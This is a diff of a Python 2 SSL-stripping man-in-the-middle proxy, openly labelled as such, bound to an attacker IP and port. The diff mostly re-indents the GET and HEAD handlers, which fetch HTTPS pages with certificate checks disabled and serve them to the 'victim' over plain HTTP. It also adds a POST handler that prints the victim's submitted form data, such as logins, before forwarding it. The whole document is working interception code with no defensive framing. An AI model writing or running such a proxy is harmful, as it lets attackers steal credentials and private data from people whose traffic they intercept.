@@ -11,92 +11,147 @@ ATTACKER_PORT = 8080
 
 
 class SSLStripProxy(BaseHTTPRequestHandler):
-	def __init__(self, request, client_address, server):
-		BaseHTTPRequestHandler.__init__(self, request, client_address, server)
-	
-	def do_GET(self):
-		host = self.headers.getheader('Host', '')
-		url = "https://{}{}".format(host, self.path)
-		print "[+] Victim requested:", url
+    def __init__(self, request, client_address, server):
+        BaseHTTPRequestHandler.__init__(self, request, client_address, server)
 
-		try:
-			parsed = urlparse.urlparse(url)
-			conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
-			path = parsed.path or "/"
-			if parsed.query:
-				path += "?" + parsed.query
+    def do_GET(self):
+        host = self.headers.getheader('Host', '')
+        url = "https://{}{}".format(host, self.path)
+        print "[+] Victim requested:", url
 
-			# Tell server not to gzip so easier to handle
-			headers = {
-				"User-Agent": "Mozilla/5.0",
-				"Accept": "*/*",
-				"Accept-Encoding": "identity",  # Request no compression
-				"Host": host
-			}
+        try:
+            parsed = urlparse.urlparse(url)
+            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
+            path = parsed.path or "/"
+            if parsed.query:
+                path += "?" + parsed.query
 
-			conn.request("GET", path, headers=headers)
-			resp = conn.getresponse()
-			content = resp.read()
-			content_encoding = resp.getheader('Content-Encoding', '')
+            headers = {
+                "User-Agent": "Mozilla/5.0",
+                "Accept": "*/*",
+                "Accept-Encoding": "identity",  # Request no compression
+                "Host": host
+            }
 
-			# If gzip, decompress before sending to victim
-			if content_encoding == 'gzip':
-				buf = StringIO(content)
-				f = gzip.GzipFile(fileobj=buf)
-				content = f.read()
+            conn.request("GET", path, headers=headers)
+            resp = conn.getresponse()
+            content = resp.read()
+            content_encoding = resp.getheader('Content-Encoding', '')
 
-			self.send_response(resp.status)
-			content_type = resp.getheader('Content-Type', 'text/html')
-			self.send_header("Content-type", content_type)
-			self.send_header("Content-Length", str(len(content)))
-			self.end_headers()
+            if content_encoding == 'gzip':
+                buf = StringIO(content)
+                f = gzip.GzipFile(fileobj=buf)
+                content = f.read()
 
-			try:
-				self.wfile.write(content)
-				self.wfile.flush()
-			except IOError as e:
-				if e.errno == errno.EPIPE:
-					print "[!] Broken pipe: client disconnected early"
-				else:
-					raise
+            self.send_response(resp.status)
+            content_type = resp.getheader('Content-Type', 'text/html')
+            self.send_header("Content-type", content_type)
+            self.send_header("Content-Length", str(len(content)))
+            self.end_headers()
 
-		except Exception as e:
-			self.send_error(502, "SSLStrip failed: {}".format(e))
+            try:
+                self.wfile.write(content)
+                self.wfile.flush()
+            except IOError as e:
+                if e.errno == errno.EPIPE:
+                    print "[!] Broken pipe: client disconnected early"
+                else:
+                    raise
 
-	def do_HEAD(self):
-		host = self.headers.getheader('Host', '')
-		url = "https://{}{}".format(host, self.path)
-		print "[+] Victim sent HEAD request:", url
+        except Exception as e:
+            self.send_error(502, "SSLStrip failed: {}".format(e))
 
-		try:
-			parsed = urlparse.urlparse(url)
-			conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
-			path = parsed.path or "/"
-			if parsed.query:
-				path += "?" + parsed.query
+    def do_HEAD(self):
+        host = self.headers.getheader('Host', '')
+        url = "https://{}{}".format(host, self.path)
+        print "[+] Victim sent HEAD request:", url
 
-			headers = {
-				"User-Agent": "Mozilla/5.0",
-				"Accept": "*/*",
-				"Accept-Encoding": "identity",
-				"Host": host
-			}
+        try:
+            parsed = urlparse.urlparse(url)
+            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
+            path = parsed.path or "/"
+            if parsed.query:
+                path += "?" + parsed.query
 
-			conn.request("HEAD", path, headers=headers)
-			resp = conn.getresponse()
-			content_type = resp.getheader('Content-Type', 'text/html')
-			content_length = resp.getheader('Content-Length', '0')
+            headers = {
+                "User-Agent": "Mozilla/5.0",
+                "Accept": "*/*",
+                "Accept-Encoding": "identity",
+                "Host": host
+            }
 
-			self.send_response(resp.status)
-			self.send_header("Content-type", content_type)
-			self.send_header("Content-Length", content_length)
-			self.end_headers()
+            conn.request("HEAD", path, headers=headers)
+            resp = conn.getresponse()
+            content_type = resp.getheader('Content-Type', 'text/html')
+            content_length = resp.getheader('Content-Length', '0')
 
-		except Exception as e:
-			self.send_error(502, "SSLStrip failed (HEAD): {}".format(e))
+            self.send_response(resp.status)
+            self.send_header("Content-type", content_type)
+            self.send_header("Content-Length", content_length)
+            self.end_headers()
+
+        except Exception as e:
+            self.send_error(502, "SSLStrip failed (HEAD): {}".format(e))
+
+    def do_POST(self):
+        host = self.headers.getheader('Host', '')
+        url = "https://{}{}".format(host, self.path)
+        print "[+] Victim sent POST request:", url
+
+        try:
+            # Read content length and body
+            content_length = int(self.headers.getheader('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            print "[*] POST data:", post_data
+
+            # Parse the target URL
+            parsed = urlparse.urlparse(url)
+            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
+            path = parsed.path or "/"
+            if parsed.query:
+                path += "?" + parsed.query
+
+            # Reconstruct headers for forwarding
+            headers = {
+                "User-Agent": "Mozilla/5.0",
+                "Accept": "*/*",
+                "Accept-Encoding": "identity",
+                "Host": host,
+                "Content-Type": self.headers.getheader("Content-Type", "application/x-www-form-urlencoded"),
+                "Content-Length": str(len(post_data))
+            }
+
+            # Forward the POST
+            conn.request("POST", path, body=post_data, headers=headers)
+            resp = conn.getresponse()
+            content = resp.read()
+            content_encoding = resp.getheader('Content-Encoding', '')
+
+            if content_encoding == 'gzip':
+                buf = StringIO(content)
+                f = gzip.GzipFile(fileobj=buf)
+                content = f.read()
+
+            self.send_response(resp.status)
+            content_type = resp.getheader('Content-Type', 'text/html')
+            self.send_header("Content-type", content_type)
+            self.send_header("Content-Length", str(len(content)))
+            self.end_headers()
+
+            try:
+                self.wfile.write(content)
+                self.wfile.flush()
+            except IOError as e:
+                if e.errno == errno.EPIPE:
+                    print "[!] Broken pipe: client disconnected early"
+                else:
+                    raise
+
+        except Exception as e:
+            self.send_error(502, "SSLStrip failed (POST): {}".format(e))
 
 
 if __name__ == "__main__":
-    print "[*] Starting SSLStrip proxy on port " + str(str(ATTACKER_PORT))
+    print "[*] Starting SSLStrip proxy on port " + str(ATTACKER_PORT)
     httpd = HTTPServer((ATTACKER_IP, ATTACKER_PORT), SSLStripProxy)
     httpd.serve_forever()
